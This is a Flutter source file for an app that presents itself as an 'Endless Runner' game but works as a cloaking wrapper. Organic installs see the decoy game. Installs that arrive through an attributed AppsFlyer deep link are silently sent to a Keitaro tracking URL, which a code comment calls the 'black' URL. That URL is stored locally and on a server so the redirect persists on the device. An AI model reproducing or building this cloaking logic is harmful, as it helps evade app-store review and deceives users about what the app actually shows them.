import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_crashlytics/firebase_crashlytics.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:http/http.dart' as http;
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';

// ─────────────────────────────────────────────
// 1. AppConfig — build-time constants
// ─────────────────────────────────────────────

class AppConfig {
  static const String gameUrl = String.fromEnvironment('GAME_URL');
  static const String afDevKey = String.fromEnvironment('AF_DEV_KEY');
  static const String appId = String.fromEnvironment('APP_PACKAGE_ID');
  static const String supabaseUrl = String.fromEnvironment('SUPABASE_URL');
  static const String builderProjectId =
      String.fromEnvironment('BUILDER_PROJECT_ID');

  static bool get isValid =>
      gameUrl.isNotEmpty &&
      afDevKey.isNotEmpty &&
      appId.isNotEmpty &&
      supabaseUrl.isNotEmpty &&
      builderProjectId.isNotEmpty;
}

// ─────────────────────────────────────────────
// 2. DeepLinkData + DeepLinkParser
// ─────────────────────────────────────────────

class DeepLinkData {
  final String username;
  final String domain;
  final String alias;
  final String sub2;
  final String sub3;
  final String sub4;
  final String sub5;

  const DeepLinkData({
    required this.username,
    required this.domain,
    required this.alias,
    this.sub2 = '',
    this.sub3 = '',
    this.sub4 = '',
    this.sub5 = '',
  });
}

class DeepLinkParser {
  static DeepLinkData? parse(String deepLinkValue) {
    if (deepLinkValue.isEmpty) return null;
    final parts = deepLinkValue.split('_');
    if (parts.length < 3) return null;
    return DeepLinkData(
      username: parts[0],
      domain: parts[1].replaceAll('-', '.'),
      alias: parts[2],
      sub2: parts.length > 3 ? parts[3] : '',
      sub3: parts.length > 4 ? parts[4] : '',
      sub4: parts.length > 5 ? parts[5] : '',
      sub5: parts.length > 6 ? parts[6] : '',
    );
  }
}

// ─────────────────────────────────────────────
// 3. PersistenceService — local + server
// ─────────────────────────────────────────────

class PersistenceService {
  static const String _localKey = 'saved_target_url';

  static Future<String?> getLocal() async {
    final prefs = await SharedPreferences.getInstance();
    final url = prefs.getString(_localKey);
    if (url != null && url.isNotEmpty) {
      debugPrint('PERSIST: Found local URL: $url');
      return url;
    }
    return null;
  }

  static Future<void> saveLocal(String url) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(_localKey, url);
    debugPrint('PERSIST: Saved URL locally');
  }

  static Future<String?> getFromServer(String appsflyerId) async {
    if (AppConfig.supabaseUrl.isEmpty || appsflyerId.isEmpty) return null;
    try {
      final uri = Uri.parse(
        '${AppConfig.supabaseUrl}/functions/v1/sync-user-status'
        '?action=get&appsflyer_id=$appsflyerId',
      );
      final response = await http.get(uri).timeout(const Duration(seconds: 5));
      if (response.statusCode == 200) {
        final body = jsonDecode(response.body);
        if (body['found'] == true && body['target_url'] != null) {
          debugPrint('PERSIST: Found server URL: ${body['target_url']}');
          return body['target_url'] as String;
        }
      }
    } catch (e) {
      debugPrint('PERSIST: Server check failed: $e');
    }
    return null;
  }

  static Future<void> saveToServer({
    required String appsflyerId,
    required String projectId,
    required String targetUrl,
  }) async {
    if (AppConfig.supabaseUrl.isEmpty || appsflyerId.isEmpty) return;
    try {
      final uri = Uri.parse(
        '${AppConfig.supabaseUrl}/functions/v1/sync-user-status',
      );
      await http
          .post(
            uri,
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({
              'action': 'save',
              'appsflyer_id': appsflyerId,
              'project_id': projectId,
              'target_url': targetUrl,
            }),
          )
          .timeout(const Duration(seconds: 5));
      debugPrint('PERSIST: Saved URL to server');
    } catch (e) {
      debugPrint('PERSIST: Server save failed: $e');
    }
  }
}

// ─────────────────────────────────────────────
// 4. AppsFlyerService
// ─────────────────────────────────────────────

class AppsFlyerService {
  AppsflyerSdk? _sdk;
  String? uid;
  final Completer<String?> _uidCompleter = Completer<String?>();

  Future<String?> get uidReady => _uidCompleter.future;

  Future<void> init({
    required void Function(DeepLinkResult) onDeepLink,
    required void Function(String campaign) onConversionData,
    required void Function() onOrganic,
  }) async {
    if (AppConfig.afDevKey.isEmpty) {
      debugPrint('AF_DEV_KEY not set — skipping AppsFlyer init');
      _uidCompleter.complete(null);
      return;
    }

    final options = AppsFlyerOptions(
      afDevKey: AppConfig.afDevKey,
      appId: AppConfig.appId,
      showDebug: true,
    );

    _sdk = AppsflyerSdk(options);

    _sdk!.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    _sdk!.startSDK();

    _sdk!.getAppsFlyerUID().then((id) {
      uid = id;
      debugPrint('AppsFlyer ID: $id');
      if (!_uidCompleter.isCompleted) _uidCompleter.complete(id);
    });

    _sdk!.onDeepLinking(onDeepLink);

    _sdk!.onInstallConversionData((data) {
      debugPrint('Conversion data received: $data');
      if (data is Map) {
        final payload = data['payload'] ?? data;
        if (payload is Map) {
          final afStatus = payload['af_status'] as String?;
          final campaign = payload['campaign'] as String?;

          // If organic — no attribution, trigger game immediately
          if (afStatus == 'Organic') {
            debugPrint('AF: Organic install detected — triggering game early');
            onOrganic();
            return;
          }

          if (campaign != null && campaign.isNotEmpty) {
            debugPrint('Campaign from conversion data: $campaign');
            onConversionData(campaign);
          }
        }
      }
    });
  }
}

// ─────────────────────────────────────────────
// 5. App entry point
// ─────────────────────────────────────────────

void main() {
  runZonedGuarded<Future<void>>(() async {
    WidgetsFlutterBinding.ensureInitialized();
    await Firebase.initializeApp();
    FlutterError.onError = FirebaseCrashlytics.instance.recordFlutterFatalError;
    runApp(const MyApp());
  }, (error, stack) {
    FirebaseCrashlytics.instance.recordError(error, stack, fatal: true);
  });
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: WebViewScreen(),
    );
  }
}

// ─────────────────────────────────────────────
// 6. WebViewScreen
// ─────────────────────────────────────────────

class WebViewScreen extends StatefulWidget {
  const WebViewScreen({super.key});

  @override
  State<WebViewScreen> createState() => _WebViewScreenState();
}

class _WebViewScreenState extends State<WebViewScreen>
    with TickerProviderStateMixin {
  late final WebViewController _controller;
  final AppsFlyerService _appsFlyerService = AppsFlyerService();

  String? _errorMessage;
  bool _isOffline = false;
  bool _deepLinkHandled = false;
  bool _loadedFromServer = false;
  bool _urlResolved = false; // true once any URL is loaded into WebView
  bool _webViewReady = false; // true after WebView finishes loading

  Timer? _fallbackTimer;
  StreamSubscription? _connectivitySubscription;

  // ── Splash animations ──
  late AnimationController _splashController;
  late AnimationController _pulseIconController;
  late AnimationController _fadeOutController;
  late Animation<double> _progressAnimation;
  late Animation<double> _pulseAnimation;
  late Animation<double> _fadeOutAnimation;
  late Animation<double> _titleFadeIn;
  late Animation<double> _subtitleFadeIn;

  @override
  void initState() {
    super.initState();

    // Progress bar fills over 10s (matches max timeout)
    _splashController = AnimationController(
      duration: const Duration(seconds: 10),
      vsync: this,
    )..forward();
    _progressAnimation = CurvedAnimation(
      parent: _splashController,
      curve: Curves.easeOut,
    );
    _titleFadeIn = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(
          parent: _splashController,
          curve: const Interval(0.0, 0.15, curve: Curves.easeOut)),
    );
    _subtitleFadeIn = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(
          parent: _splashController,
          curve: const Interval(0.05, 0.2, curve: Curves.easeOut)),
    );

    // Pulsing icon
    _pulseIconController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    )..repeat(reverse: true);
    _pulseAnimation = Tween<double>(begin: 0.85, end: 1.15).animate(
      CurvedAnimation(
          parent: _pulseIconController, curve: Curves.easeInOut),
    );

    // Fade-out for splash → WebView transition
    _fadeOutController = AnimationController(
      duration: const Duration(milliseconds: 400),
      vsync: this,
    );
    _fadeOutAnimation = Tween<double>(begin: 1.0, end: 0.0).animate(
      CurvedAnimation(parent: _fadeOutController, curve: Curves.easeIn),
    );

    if (AppConfig.gameUrl.isEmpty) {
      _errorMessage =
          'GAME_URL is not configured.\n\nThe app was built without a valid URL. Please rebuild with a valid GAME_URL.';
      return;
    }

    _initWebViewController();
    _startInitSequence();
    _initConnectivityListener();
  }

  // ─────────────────────────────────────────
  // Init sequence: local → (server + deeplink in parallel) → fallback
  // ─────────────────────────────────────────

  Future<void> _startInitSequence() async {
    // ── Step 1: Local persistence (instant) ──
    final localUrl = await PersistenceService.getLocal();
    if (localUrl != null && localUrl.isNotEmpty) {
      debugPrint('INIT: Restored from local storage — immediate load');
      _deepLinkHandled = true;
      _loadedFromServer = true;
      _resolveUrl(localUrl);
      return;
    }

    // ── Step 2: Init AppsFlyer + start parallel server check ──
    _appsFlyerService.init(
      onDeepLink: _onDeepLinkResult,
      onConversionData: _onConversionCampaign,
      onOrganic: _onOrganicDetected,
    );

    // Server check runs in parallel with deep link listener
    _checkServerInParallel();

    // ── Step 3: Max 10s fallback timer ──
    _fallbackTimer = Timer(const Duration(seconds: 10), () {
      if (!_deepLinkHandled && mounted) {
        debugPrint('INIT: 10s max timeout — loading game (NOT persisted)');
        _resolveUrl(AppConfig.gameUrl);
      }
    });
  }

  Future<void> _checkServerInParallel() async {
    final afId = await _appsFlyerService.uidReady.timeout(
      const Duration(seconds: 3),
      onTimeout: () => _appsFlyerService.uid,
    );

    if (_deepLinkHandled) return; // deep link won the race

    if (afId != null && afId.isNotEmpty) {
      final serverUrl = await PersistenceService.getFromServer(afId);
      if (_deepLinkHandled) return; // deep link won while fetching

      if (serverUrl != null && serverUrl.isNotEmpty) {
        debugPrint('INIT: Server URL found — immediate load');
        _deepLinkHandled = true;
        _loadedFromServer = true;
        _fallbackTimer?.cancel();
        await PersistenceService.saveLocal(serverUrl);
        _resolveUrl(serverUrl);
      }
    }
  }

  /// Called when AppsFlyer reports an organic install (no attribution).
  /// Skips the remaining timeout and loads the game immediately.
  void _onOrganicDetected() {
    if (_deepLinkHandled) return;
    debugPrint('INIT: Organic detected — loading game early (NOT persisted)');
    _fallbackTimer?.cancel();
    _resolveUrl(AppConfig.gameUrl);
  }

  /// Central method: load URL into WebView and trigger splash fade-out.
  void _resolveUrl(String url) {
    if (_urlResolved) return;
    _urlResolved = true;
    _fallbackTimer?.cancel();
    _splashController.stop();
    _loadUrl(url);
  }

  /// Trigger the splash → WebView crossfade
  void _onWebViewFinished() {
    if (_webViewReady) return;
    _webViewReady = true;
    _fadeOutController.forward().then((_) {
      if (mounted) setState(() {});
    });
    if (mounted) setState(() {});
  }

  @override
  void dispose() {
    _splashController.dispose();
    _pulseIconController.dispose();
    _fadeOutController.dispose();
    _connectivitySubscription?.cancel();
    _fallbackTimer?.cancel();
    super.dispose();
  }

  // ── Conversion data fallback ──

  void _onConversionCampaign(String campaign) {
    if (_deepLinkHandled) return;
    final parsed = DeepLinkParser.parse(campaign);
    if (parsed != null) {
      debugPrint('Using campaign as fallback deep link: $campaign');
      _handleDeepLink(campaign);
    } else {
      debugPrint('Campaign does not match deep link pattern: $campaign');
    }
  }

  // ── Deep link callback ──

  void _onDeepLinkResult(DeepLinkResult result) {
    debugPrint('Deep link result: ${result.status}');
    _fallbackTimer?.cancel();

    if (result.status == Status.FOUND) {
      final deepLink = result.deepLink;
      if (deepLink == null) {
        debugPrint('DeepLink object is NULL');
        return;
      }

      final deepLinkValue = deepLink.deepLinkValue ?? '';
      String? clickEvent;
      try {
        clickEvent = deepLink.clickEvent.toString();
      } catch (_) {
        clickEvent = 'clickEvent unavailable';
      }
      debugPrint(
          'DEBUG FULL DUMP:\ndeepLinkValue: "$deepLinkValue"\nclickEvent: $clickEvent');

      String resolvedValue = deepLinkValue;

      if (resolvedValue.isEmpty) {
        try {
          final event = deepLink.clickEvent;
          if (event is Map) {
            for (final key in [
              'deep_link_value', 'link', 'click_http_referrer',
              'af_dp', 'deep_link_sub1', 'campaign'
            ]) {
              final v = event[key];
              if (v != null && v.toString().isNotEmpty) {
                resolvedValue = v.toString();
                debugPrint('DEBUG: Found in clickEvent["$key"]: $resolvedValue');
                break;
              }
            }
          }
        } catch (e) {
          debugPrint('DEBUG: Error scanning clickEvent: $e');
        }
      }

      if (resolvedValue.isEmpty) {
        for (final key in [
          'deep_link_value', 'link', 'click_http_referrer',
          'af_dp', 'deep_link_sub1'
        ]) {
          try {
            final v = deepLink.getStringValue(key);
            if (v != null && v.isNotEmpty) {
              resolvedValue = v;
              debugPrint('DEBUG: Found via getStringValue("$key"): $resolvedValue');
              break;
            }
          } catch (_) {}
        }
      }

      if (resolvedValue.isEmpty) {
        debugPrint('DEBUG: All deep link fields empty — loading game');
        _resolveUrl(AppConfig.gameUrl);
        return;
      }

      // Deep link has ABSOLUTE priority — override server-loaded state
      if (_loadedFromServer) {
        debugPrint('PRIORITY: Real deep link overriding server-loaded URL');
        _deepLinkHandled = false;
        _loadedFromServer = false;
        _urlResolved = false;
      }

      _handleDeepLink(resolvedValue);
    } else {
      debugPrint('DeepLink status: ${result.status}');
    }
  }

  // ── Handle deep link ──

  Future<void> _handleDeepLink(String deepLinkValue) async {
    try {
      if (deepLinkValue.isEmpty || _deepLinkHandled) return;
      _deepLinkHandled = true;
      _fallbackTimer?.cancel();

      String cleanValue = deepLinkValue;
      final schemeIdx = cleanValue.indexOf('://');
      if (schemeIdx != -1) cleanValue = cleanValue.substring(schemeIdx + 3);
      cleanValue = cleanValue.replaceAll(RegExp(r'^/+|/+$'), '').trim();
      debugPrint('DEBUG: Cleaned value: $cleanValue');

      final data = DeepLinkParser.parse(cleanValue);
      if (data == null) {
        debugPrint('DEBUG: PARSE FAILED for: $cleanValue');
        _resolveUrl(AppConfig.gameUrl);
        return;
      }

      debugPrint(
          'DEBUG: S1: user=${data.username} dom=${data.domain} alias=${data.alias}');

      // resolve-user (bypass on error)
      if (AppConfig.supabaseUrl.isNotEmpty) {
        try {
          final response = await http.get(Uri.parse(
              '${AppConfig.supabaseUrl}/functions/v1/resolve-user?username=${data.username}'));
          debugPrint('DEBUG: S2: ${response.statusCode} — ${response.body}');
        } catch (e) {
          debugPrint('DEBUG: S2: NET ERROR: $e — bypassing');
        }
      }

      // Build Keitaro URL
      final afId = _appsFlyerService.uid ?? 'no-uid';
      final keitaroUrl = 'https://${data.domain}/${data.alias}'
          '?sub1=${AppConfig.appId}'
          '&sub2=${data.sub2}'
          '&sub3=${data.sub3}'
          '&sub4=${data.sub4}'
          '&sub5=${data.sub5}'
          '&sub9=${AppConfig.builderProjectId}'
          '&sub10=$afId';

      debugPrint('DEBUG: S3: Loading $keitaroUrl');

      // Persist 'black' URL
      await PersistenceService.saveLocal(keitaroUrl);
      if (!_loadedFromServer) {
        PersistenceService.saveToServer(
          appsflyerId: afId,
          projectId: AppConfig.builderProjectId,
          targetUrl: keitaroUrl,
        );
      } else {
        debugPrint('PERSIST: Skipping server save — already on server');
      }

      _resolveUrl(keitaroUrl);
    } catch (e, stack) {
      debugPrint('FATAL in _handleDeepLink: $e\n$stack');
      FirebaseCrashlytics.instance
          .recordError(e, stack, reason: 'Deep link handling');
      _resolveUrl(AppConfig.gameUrl);
    }
  }

  // ── Connectivity ──

  void _initConnectivityListener() {
    _checkConnectivity();
    _connectivitySubscription =
        Connectivity().onConnectivityChanged.listen((results) {
      final isConnected = results.any((r) => r != ConnectivityResult.none);
      if (mounted) {
        final wasOffline = _isOffline;
        setState(() => _isOffline = !isConnected);
        if (wasOffline && isConnected) _retryLoading();
      }
    });
  }

  Future<void> _checkConnectivity() async {
    final results = await Connectivity().checkConnectivity();
    final isConnected = results.any((r) => r != ConnectivityResult.none);
    if (mounted) setState(() => _isOffline = !isConnected);
  }

  void _retryLoading() {
    if (!_deepLinkHandled) {
      _resolveUrl(AppConfig.gameUrl);
    } else {
      _controller.reload();
    }
  }

  // ── WebView ──

  void _initWebViewController() {
    Uri? parsedUri;
    try {
      parsedUri = Uri.parse(AppConfig.gameUrl);
      if (!parsedUri.hasScheme || !parsedUri.hasAuthority) {
        throw FormatException('Invalid URL: ${AppConfig.gameUrl}');
      }
    } catch (e) {
      _errorMessage = 'Invalid GAME_URL: ${AppConfig.gameUrl}\n\nError: $e';
      return;
    }

    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageStarted: (url) => debugPrint('Loading: $url'),
          onPageFinished: (url) {
            debugPrint('Loaded: $url');
            _onWebViewFinished();
          },
          onWebResourceError: (error) {
            debugPrint('WebView error: ${error.description}');
            if (error.errorType == WebResourceErrorType.hostLookup ||
                error.errorType == WebResourceErrorType.connect ||
                error.errorType == WebResourceErrorType.timeout ||
                error.description.contains('net::ERR_INTERNET_DISCONNECTED') ||
                error.description.contains('net::ERR_NAME_NOT_RESOLVED') ||
                error.description.contains('net::ERR_CONNECTION')) {
              if (mounted) setState(() => _isOffline = true);
            }
            FirebaseCrashlytics.instance.recordError(
              Exception('WebView error: ${error.description}'),
              null,
              reason: 'WebView resource error',
            );
          },
        ),
      );
  }

  void _loadUrl(String url) {
    _controller.loadRequest(Uri.parse(url));
  }

  // ── UI ──

  @override
  Widget build(BuildContext context) {
    if (_errorMessage != null) return _buildErrorScreen();
    if (_isOffline) return _buildOfflineScreen();

    return Scaffold(
      body: Stack(
        children: [
          // WebView is always underneath
          if (_urlResolved)
            Positioned.fill(
              child: SafeArea(child: WebViewWidget(controller: _controller)),
            ),

          // Splash overlay — fades out after WebView finishes loading
          if (!_webViewReady || _fadeOutController.isAnimating)
            FadeTransition(
              opacity: _fadeOutAnimation,
              child: _buildSplashScreen(),
            ),
        ],
      ),
    );
  }

  Widget _buildSplashScreen() {
    return Container(
      width: double.infinity,
      height: double.infinity,
      decoration: const BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
          colors: [Color(0xFF1A1A2E), Color(0xFF16213E), Color(0xFF0F3460)],
        ),
      ),
      child: SafeArea(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Spacer(flex: 3),

            // ── Pulsing icon ──
            AnimatedBuilder(
              animation: _pulseAnimation,
              builder: (context, child) {
                return Transform.scale(
                  scale: _pulseAnimation.value,
                  child: Container(
                    width: 100,
                    height: 100,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: const RadialGradient(
                        colors: [Color(0xFF3B82F6), Color(0xFF1E40AF)],
                      ),
                      boxShadow: [
                        BoxShadow(
                          color: const Color(0xFF3B82F6).withOpacity(0.4),
                          blurRadius: 30,
                          spreadRadius: 5,
                        ),
                      ],
                    ),
                    child: const Icon(
                      Icons.sports_esports_rounded,
                      color: Colors.white,
                      size: 48,
                    ),
                  ),
                );
              },
            ),

            const SizedBox(height: 32),

            // ── Title ──
            FadeTransition(
              opacity: _titleFadeIn,
              child: const Text(
                'ENDLESS RUNNER',
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 28,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 4,
                  shadows: [
                    Shadow(
                        color: Color(0xFF3B82F6),
                        blurRadius: 20,
                        offset: Offset(0, 2)),
                  ],
                ),
              ),
            ),

            const SizedBox(height: 8),

            FadeTransition(
              opacity: _subtitleFadeIn,
              child: Text(
                'LOADING',
                style: TextStyle(
                  color: Colors.white.withOpacity(0.5),
                  fontSize: 13,
                  fontWeight: FontWeight.w500,
                  letterSpacing: 6,
                ),
              ),
            ),

            const Spacer(flex: 2),

            // ── Progress bar ──
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 60),
              child: AnimatedBuilder(
                animation: _progressAnimation,
                builder: (context, child) {
                  return Column(
                    children: [
                      ClipRRect(
                        borderRadius: BorderRadius.circular(4),
                        child: SizedBox(
                          height: 3,
                          child: LinearProgressIndicator(
                            value: _progressAnimation.value,
                            backgroundColor: Colors.white.withOpacity(0.08),
                            valueColor: const AlwaysStoppedAnimation<Color>(
                                Color(0xFF3B82F6)),
                          ),
                        ),
                      ),
                      const SizedBox(height: 12),
                      Text(
                        '${(_progressAnimation.value * 100).toInt()}%',
                        style: TextStyle(
                          color: Colors.white.withOpacity(0.3),
                          fontSize: 11,
                          fontWeight: FontWeight.w400,
                        ),
                      ),
                    ],
                  );
                },
              ),
            ),

            const Spacer(flex: 1),
          ],
        ),
      ),
    );
  }

  Widget _buildErrorScreen() {
    return Scaffold(
      backgroundColor: const Color(0xFF1A1A2E),
      body: SafeArea(
        child: Center(
          child: Padding(
            padding: const EdgeInsets.all(32.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const Icon(Icons.error_outline,
                    color: Colors.redAccent, size: 64),
                const SizedBox(height: 24),
                const Text(
                  'Configuration Error',
                  style: TextStyle(
                      color: Colors.white,
                      fontSize: 22,
                      fontWeight: FontWeight.bold),
                ),
                const SizedBox(height: 16),
                Text(
                  _errorMessage!,
                  textAlign: TextAlign.center,
                  style: const TextStyle(
                      color: Colors.white70, fontSize: 14, height: 1.5),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildOfflineScreen() {
    return Scaffold(
      backgroundColor: const Color(0xFF1A1A2E),
      body: SafeArea(
        child: Center(
          child: Padding(
            padding: const EdgeInsets.all(40.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                AnimatedBuilder(
                  animation: _pulseAnimation,
                  builder: (context, child) {
                    return Transform.scale(
                      scale: _pulseAnimation.value,
                      child: Container(
                        width: 120,
                        height: 120,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: Colors.white.withOpacity(0.05),
                          border: Border.all(
                              color: Colors.white.withOpacity(0.1), width: 2),
                        ),
                        child: const Icon(Icons.wifi_off_rounded,
                            color: Colors.white70, size: 56),
                      ),
                    );
                  },
                ),
                const SizedBox(height: 40),
                const Text(
                  'No Internet Connection',
                  style: TextStyle(
                      color: Colors.white,
                      fontSize: 24,
                      fontWeight: FontWeight.bold,
                      letterSpacing: -0.5),
                ),
                const SizedBox(height: 12),
                const Text(
                  'Please check your Wi-Fi or mobile data\nand try again',
                  textAlign: TextAlign.center,
                  style: TextStyle(
                      color: Colors.white54, fontSize: 16, height: 1.5),
                ),
                const SizedBox(height: 40),
                SizedBox(
                  width: 200,
                  height: 52,
                  child: ElevatedButton(
                    onPressed: _retryLoading,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFF3B82F6),
                      foregroundColor: Colors.white,
                      shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(16)),
                      elevation: 0,
                    ),
                    child: const Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.refresh_rounded, size: 20),
                        SizedBox(width: 8),
                        Text('Try Again',
                            style: TextStyle(
                                fontSize: 16, fontWeight: FontWeight.w600)),
                      ],
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
